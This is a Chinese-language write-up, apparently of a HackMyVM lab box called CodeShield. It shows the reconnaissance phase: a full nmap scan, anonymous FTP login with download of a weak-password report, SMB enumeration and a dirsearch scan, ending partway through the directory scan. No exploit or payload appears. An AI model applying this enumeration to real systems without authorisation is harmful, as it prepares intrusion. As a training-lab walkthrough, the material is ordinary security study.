<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.154 -sV -A -p-</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-17 <span class="token number">10</span>:04 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.154
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00077s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65521</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE       VERSION
<span class="token number">21</span>/tcp    <span class="token function">open</span>  <span class="token function">ftp</span>           vsftpd <span class="token number">3.0</span>.5
<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
<span class="token operator">|</span> -rw-rw-r--    <span class="token number">1</span> <span class="token number">1002</span>     <span class="token number">1002</span>      <span class="token number">2349914</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> CodeShield_pitch_deck.pdf
<span class="token operator">|</span> -rw-rw-r--    <span class="token number">1</span> <span class="token number">1003</span>     <span class="token number">1003</span>        <span class="token number">67520</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Information_Security_Policy.pdf
<span class="token operator">|</span>_-rw-rw-r--    <span class="token number">1</span> <span class="token number">1004</span>     <span class="token number">1004</span>       <span class="token number">226435</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> The_2023_weak_password_report.pdf
<span class="token operator">|</span> ftp-syst: 
<span class="token operator">|</span>   STAT: 
<span class="token operator">|</span> FTP server status:
<span class="token operator">|</span>      Connected to ::ffff:192.168.56.104
<span class="token operator">|</span>      Logged <span class="token keyword">in</span> as <span class="token function">ftp</span>
<span class="token operator">|</span>      TYPE: ASCII
<span class="token operator">|</span>      No session bandwidth limit
<span class="token operator">|</span>      Session <span class="token function">timeout</span> <span class="token keyword">in</span> seconds is <span class="token number">300</span>
<span class="token operator">|</span>      Control connection is plain text
<span class="token operator">|</span>      Data connections will be plain text
<span class="token operator">|</span>      At session startup, client count was <span class="token number">1</span>
<span class="token operator">|</span>      vsFTPd <span class="token number">3.0</span>.5 - secure, fast, stable
<span class="token operator">|</span>_End of status
<span class="token number">22</span>/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>           OpenSSH <span class="token number">6</span>.0p1 Debian <span class="token number">4</span>+deb7u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">32</span>:14:67:32:02:7a:b6:e4:7f:a7:22:0b:02:fd:ee:07 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">34</span>:e4:d0:5d:bd:bc:9e:3f:4c:f9:1e:7d:3c:60:ce:6e <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> ef:3c:ff:f9:9a:a3:aa:7d:5a:82:73:b9:8c:b8:97:04 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">25</span>/tcp    <span class="token function">open</span>  smtp          Postfix smtpd
<span class="token operator">|</span>_smtp-commands: SMTP: EHLO <span class="token number">521</span> <span class="token number">5.5</span>.1 Protocol error<span class="token punctuation">\</span>x0D
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http          nginx
<span class="token operator">|</span>_http-title: Did not follow redirect to https://192.168.56.154/
<span class="token number">110</span>/tcp   <span class="token function">open</span>  pop3          Dovecot pop3d
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span>_pop3-capabilities: CAPA SASL RESP-CODES STLS AUTH-RESP-CODE UIDL PIPELINING TOP
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>mail.codeshield.hmv/organizationName<span class="token operator">=</span>mail.codeshield.hmv/stateOrProvinceName<span class="token operator">=</span>GuangDong/countryName<span class="token operator">=</span>CN
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-08-26T09:34:43
<span class="token operator">|</span>_Not valid after:  <span class="token number">2033</span>-08-23T09:34:43
<span class="token number">143</span>/tcp   <span class="token function">open</span>  imap          Dovecot imapd <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span>_imap-capabilities: OK post-login LITERAL+ <span class="token function">more</span> ENABLE Pre-login IDLE ID listed have capabilities LOGINDISABLEDA0001 SASL-IR LOGIN-REFERRALS IMAP4rev1 STARTTLS
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>mail.codeshield.hmv/organizationName<span class="token operator">=</span>mail.codeshield.hmv/stateOrProvinceName<span class="token operator">=</span>GuangDong/countryName<span class="token operator">=</span>CN
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-08-26T09:34:43
<span class="token operator">|</span>_Not valid after:  <span class="token number">2033</span>-08-23T09:34:43
<span class="token number">443</span>/tcp   <span class="token function">open</span>  ssl/http      nginx
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>mail.codeshield.hmv/organizationName<span class="token operator">=</span>mail.codeshield.hmv/stateOrProvinceName<span class="token operator">=</span>GuangDong/countryName<span class="token operator">=</span>CN
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-08-26T09:34:43
<span class="token operator">|</span>_Not valid after:  <span class="token number">2033</span>-08-23T09:34:43
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span>_http-title: CodeShield - Home
<span class="token operator">|</span> http-robots.txt: <span class="token number">1</span> disallowed entry 
<span class="token operator">|</span>_/
<span class="token number">465</span>/tcp   <span class="token function">open</span>  ssl/smtp      Postfix smtpd
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span>_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: failed to receive data
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>mail.codeshield.hmv/organizationName<span class="token operator">=</span>mail.codeshield.hmv/stateOrProvinceName<span class="token operator">=</span>GuangDong/countryName<span class="token operator">=</span>CN
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-08-26T09:34:43
<span class="token operator">|</span>_Not valid after:  <span class="token number">2033</span>-08-23T09:34:43
<span class="token number">587</span>/tcp   <span class="token function">open</span>  smtp          Postfix smtpd
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>mail.codeshield.hmv/organizationName<span class="token operator">=</span>mail.codeshield.hmv/stateOrProvinceName<span class="token operator">=</span>GuangDong/countryName<span class="token operator">=</span>CN
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-08-26T09:34:43
<span class="token operator">|</span>_Not valid after:  <span class="token number">2033</span>-08-23T09:34:43
<span class="token operator">|</span>_smtp-commands: mail.codeshield.hmv, PIPELINING, SIZE <span class="token number">15728640</span>, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token number">993</span>/tcp   <span class="token function">open</span>  imaps?
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>mail.codeshield.hmv/organizationName<span class="token operator">=</span>mail.codeshield.hmv/stateOrProvinceName<span class="token operator">=</span>GuangDong/countryName<span class="token operator">=</span>CN
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-08-26T09:34:43
<span class="token operator">|</span>_Not valid after:  <span class="token number">2033</span>-08-23T09:34:43
<span class="token number">995</span>/tcp   <span class="token function">open</span>  pop3s?
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>mail.codeshield.hmv/organizationName<span class="token operator">=</span>mail.codeshield.hmv/stateOrProvinceName<span class="token operator">=</span>GuangDong/countryName<span class="token operator">=</span>CN
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-08-26T09:34:43
<span class="token operator">|</span>_Not valid after:  <span class="token number">2033</span>-08-23T09:34:43
<span class="token operator">|</span>_pop3-capabilities: CAPA SASL<span class="token punctuation">(</span>PLAIN LOGIN<span class="token punctuation">)</span> RESP-CODES UIDL AUTH-RESP-CODE <span class="token environment constant">USER</span> PIPELINING TOP
<span class="token number">2222</span>/tcp  <span class="token function">open</span>  <span class="token function">ssh</span>           OpenSSH <span class="token number">6</span>.0p1 Debian <span class="token number">4</span>+deb7u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">32</span>:14:67:32:02:7a:b6:e4:7f:a7:22:0b:02:fd:ee:07 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">34</span>:e4:d0:5d:bd:bc:9e:3f:4c:f9:1e:7d:3c:60:ce:6e <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> ef:3c:ff:f9:9a:a3:aa:7d:5a:82:73:b9:8c:b8:97:04 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">3389</span>/tcp  <span class="token function">open</span>  ms-wbt-server xrdp
<span class="token number">22222</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>           OpenSSH <span class="token number">8</span>.9p1 Ubuntu 3ubuntu0.3 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">256</span> 2a:49:28:84:25:99:62:e8:29:68:88:d6:36:be:8e:d6 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">20</span>:9f:5b:3f:52:eb:a9:60:27:39:3b:e7:d8:17:8d:70 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
MAC Address: 08:00:27:61:49:1F <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
No exact OS matches <span class="token keyword">for</span> <span class="token function">host</span> <span class="token punctuation">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="token punctuation">)</span>.
TCP/IP fingerprint:
OS:SCAN<span class="token punctuation">(</span>V<span class="token operator">=</span><span class="token number">7</span>.94SVN%E<span class="token operator">=</span><span class="token number">4</span>%D<span class="token operator">=</span><span class="token number">4</span>/17%OT<span class="token operator">=</span><span class="token number">21</span>%CT<span class="token operator">=</span><span class="token number">1</span>%CU<span class="token operator">=</span><span class="token number">30783</span>%PV<span class="token operator">=</span>Y%DS<span class="token operator">=</span><span class="token number">1</span>%DC<span class="token operator">=</span>D%G<span class="token operator">=</span>Y%M<span class="token operator">=</span>08002
OS:7%TM<span class="token operator">=</span>661F2E73%P<span class="token operator">=</span>x86_64-pc-linux-gnu<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span>SP<span class="token operator">=</span><span class="token number">103</span>%GCD<span class="token operator">=</span><span class="token number">1</span>%ISR<span class="token operator">=</span>10A%TI<span class="token operator">=</span>Z%CI<span class="token operator">=</span>Z%I
OS:I<span class="token operator">=</span>I%TS<span class="token operator">=</span>A<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span>SP<span class="token operator">=</span><span class="token number">103</span>%GCD<span class="token operator">=</span><span class="token number">2</span>%ISR<span class="token operator">=</span>10A%TI<span class="token operator">=</span>Z%CI<span class="token operator">=</span>Z%II<span class="token operator">=</span>I%TS<span class="token operator">=</span>A<span class="token punctuation">)</span>OPS<span class="token punctuation">(</span>O1<span class="token operator">=</span>M5B4ST11NW7
OS:%O2<span class="token operator">=</span>M5B4ST11NW7%O3<span class="token operator">=</span>M5B4NNT11NW7%O4<span class="token operator">=</span>M5B4ST11NW7%O5<span class="token operator">=</span>M5B4ST11NW7%O6<span class="token operator">=</span>M5B4ST1
OS:1<span class="token punctuation">)</span>WIN<span class="token punctuation">(</span>W1<span class="token operator">=</span>FE88%W2<span class="token operator">=</span>FE88%W3<span class="token operator">=</span>FE88%W4<span class="token operator">=</span>FE88%W5<span class="token operator">=</span>FE88%W6<span class="token operator">=</span>FE88<span class="token punctuation">)</span>ECN<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">81</span>%
OS:W<span class="token operator">=</span>FAF0%O<span class="token operator">=</span>M5B4NNSNW7%CC<span class="token operator">=</span>Y%Q<span class="token operator">=</span><span class="token punctuation">)</span>T1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">81</span>%S<span class="token operator">=</span>O%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AS%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T2<span class="token punctuation">(</span>R<span class="token operator">=</span>
OS:N<span class="token punctuation">)</span>T3<span class="token punctuation">(</span>R<span class="token operator">=</span>N<span class="token punctuation">)</span>T4<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">81</span>%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>A%A<span class="token operator">=</span>Z%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T5<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">81</span>%W<span class="token operator">=</span>
OS:0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T6<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">81</span>%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>A%A<span class="token operator">=</span>Z%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T
OS:7<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">81</span>%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>U1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>N%T<span class="token operator">=</span><span class="token number">81</span>%IPL<span class="token operator">=</span><span class="token number">164</span>%UN
OS:<span class="token operator">=</span><span class="token number">0</span>%RIPL<span class="token operator">=</span>G%RID<span class="token operator">=</span>G%RIPCK<span class="token operator">=</span>G%RUCK<span class="token operator">=</span>G%RUD<span class="token operator">=</span>G<span class="token punctuation">)</span>IE<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DFI<span class="token operator">=</span>N%T<span class="token operator">=</span><span class="token number">81</span>%CD<span class="token operator">=</span>S<span class="token punctuation">)</span>

Network Distance: <span class="token number">1</span> hop
Service Info: Hosts: -mail.codeshield.hmv,  mail.codeshield.hmv<span class="token punctuation">;</span> OSs: Unix, Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.77</span> ms <span class="token number">192.168</span>.56.154

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">48.10</span> seconds</code></pre>
<p>开了好多端口，整理一下<code>21 22 25 80 100 143 443 465 587 993 995 2222 3389 22222</code><br>先从21端口看</p>
<h3 id="ftp匿名登录"><a href="#ftp匿名登录" class="headerlink" title="ftp匿名登录"></a>ftp匿名登录</h3><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ftp 192.168.56.154                                      </span>
Connected to <span class="token number">192.168</span>.56.154.
<span class="token number">220</span> <span class="token punctuation">(</span>vsFTPd <span class="token number">3.0</span>.5<span class="token punctuation">)</span>
Name <span class="token punctuation">(</span><span class="token number">192.168</span>.56.154:root<span class="token punctuation">)</span>: Anonymous
<span class="token number">331</span> Please specify the password.
Password: 
<span class="token number">230</span> Login successful.
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">50231</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">137</span>          <span class="token number">4096</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">137</span>          <span class="token number">4096</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-rw-r--    <span class="token number">1</span> <span class="token number">1002</span>     <span class="token number">1002</span>      <span class="token number">2349914</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> CodeShield_pitch_deck.pdf
-rw-rw-r--    <span class="token number">1</span> <span class="token number">1003</span>     <span class="token number">1003</span>        <span class="token number">67520</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Information_Security_Policy.pdf
-rw-rw-r--    <span class="token number">1</span> <span class="token number">1004</span>     <span class="token number">1004</span>       <span class="token number">226435</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> The_2023_weak_password_report.pdf
<span class="token number">226</span> Directory send OK.
ftp<span class="token operator">></span> get 
CodeShield_pitch_deck.pdf               Information_Security_Policy.pdf         The_2023_weak_password_report.pdf
ftp<span class="token operator">></span> get CodeShield_pitch_deck.pdf
local: CodeShield_pitch_deck.pdf remote: CodeShield_pitch_deck.pdf
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">17533</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> CodeShield_pitch_deck.pdf <span class="token punctuation">(</span><span class="token number">2349914</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>*********************************************************************************************************************************************************************************************************<span class="token operator">|</span>  <span class="token number">2294</span> KiB   <span class="token number">95.91</span> MiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">2349914</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">82.59</span> MiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> get Information_Security_Policy.pdf
local: Information_Security_Policy.pdf remote: Information_Security_Policy.pdf
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">57398</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> Information_Security_Policy.pdf <span class="token punctuation">(</span><span class="token number">67520</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>*********************************************************************************************************************************************************************************************************<span class="token operator">|</span> <span class="token number">67520</span>        <span class="token number">9.87</span> MiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">67520</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">9.01</span> MiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> get The_2023_weak_password_report.pdf
local: The_2023_weak_password_report.pdf remote: The_2023_weak_password_report.pdf
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">10209</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> The_2023_weak_password_report.pdf <span class="token punctuation">(</span><span class="token number">226435</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>*********************************************************************************************************************************************************************************************************<span class="token operator">|</span>   <span class="token number">221</span> KiB   <span class="token number">23.68</span> MiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">226435</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">20.47</span> MiB/s<span class="token punctuation">)</span></code></pre>
<p>有三个pdf文件，get下来看一下<br>第一个pdf下面有个用户名和邮箱<br><img src="https://ooo.0x0.ooo/2024/04/17/OmXJsG.png" alt="OmXJsG.png" loading="lazy"><br>第二个pdf打开没什么有用信息<br><img src="https://ooo.0x0.ooo/2024/04/17/OmXRo1.png" alt="OmXRo1.png" loading="lazy"><br>第三个pdf打开可以看到一些弱口令<br><img src="https://ooo.0x0.ooo/2024/04/17/OmXteI.png" alt="OmXteI.png" loading="lazy"><br>保存下来<br>21端口就看到这</p>
<h3 id="smb枚举"><a href="#smb枚举" class="headerlink" title="smb枚举"></a>smb枚举</h3><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># enum4linux 192.168.56.154                                   </span>
Starting enum4linux v0.9.1 <span class="token punctuation">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="token punctuation">)</span> on Wed Apr <span class="token number">17</span> <span class="token number">10</span>:22:01 <span class="token number">2024</span>

 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">(</span> Target Information <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
                                                                                                                                                                                                                                                      
Target <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token number">192.168</span>.56.154                                                                                                                                                                                                                     
RID Range <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span> <span class="token number">500</span>-550,1000-1050
Username <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token string">''</span>
Password <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token string">''</span>
Known Usernames <span class="token punctuation">..</span> administrator, guest, krbtgt, domain admins, root, bin, none


 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">(</span> Enumerating Workgroup/Domain on <span class="token number">192.168</span>.56.154 <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                      
<span class="token punctuation">[</span>E<span class="token punctuation">]</span> Can<span class="token string">'t find workgroup/domain                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                      

 ===============================( Nbtstat Information for 192.168.56.154 )===============================
                                                                                                                                                                                                                                                      
Looking up status of 192.168.56.154                                                                                                                                                                                                                   
No reply from 192.168.56.154

 ==================================( Session Check on 192.168.56.154 )==================================
                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                      
[E] Server doesn'</span>t allow session using username <span class="token string">''</span>, password <span class="token string">''</span><span class="token builtin class-name">.</span>  Aborting remainder of tests.    </code></pre>
<p>无果</p>
<h3 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h3><p><img src="https://ooo.0x0.ooo/2024/04/17/OmX4GD.png" alt="OmX4GD.png" loading="lazy"><br>源码看了一下没什么有用的地方,不够浏览一下功能发现有很多的用户名<br><img src="https://ooo.0x0.ooo/2024/04/17/OmXD3F.png" alt="OmXD3F.png" loading="lazy"></p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># dirsearch -u https://192.168.56.154</span>
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources <span class="token function">import</span> DistributionNotFound, VersionConflict

  _<span class="token operator">|</span><span class="token builtin class-name">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0.4.3                                                                                                                                                                                                                      
 <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span>/_<span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                      
Extensions: php, aspx, jsp, html, js <span class="token operator">|</span> HTTP method: GET <span class="token operator">|</span> Threads: <span class="token number">25</span> <span class="token operator">|</span> Wordlist size: <span class="token number">11460</span>

Output File: /root/Desktop/reports/https_192.168.56.154/_24-04-17_10-31-04.txt

Target: https://192.168.56.154/

<span class="token punctuation">[</span><span class="token number">10</span>:31:04<span class="token punctuation">]</span> Starting:                                                                                                                                                                                                                                  
<span class="token punctuation">[</span><span class="token number">10</span>:31:04<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /%2e%2e<span class="token punctuation">;</span>/test
<span class="token punctuation">[</span><span class="token number">10</span>:31:04<span class="token punctuation">]</span> <span class="token number">301</span> -  162B  - /js  -<span class="token operator">></span>  https://192.168.56.154/js/               
<span class="token punctuation">[</span><span class="token number">10</span>:31:10<span class="token punctuation">]</span> <span class="token number">301</span> -  162B  - /.well-known/caldav  -<span class="token operator">></span>  https://192.168.56.154/SOGo/dav
<span class="token punctuation">[</span><span class="token number">10</span>:31:10<span class="token punctuation">]</span> <span class="token number">301</span> -  162B  - /.well-known/carddav  -<span class="token operator">></span>  https://192.168.56.154/SOGo/dav
<span class="token punctuation">[</span><span class="token number">10</span>:31:15<span class="token punctuation">]</span> <span class="token number">200</span> -   27KB - /about.html                                       
<span class="token punctuation">[</span><span class="token number">10</span>:31:16<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /admin/.config                                    
<span class="token punctuation">[</span><span class="token number">10</span>:31:19<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /admrev/.ftppass                                  
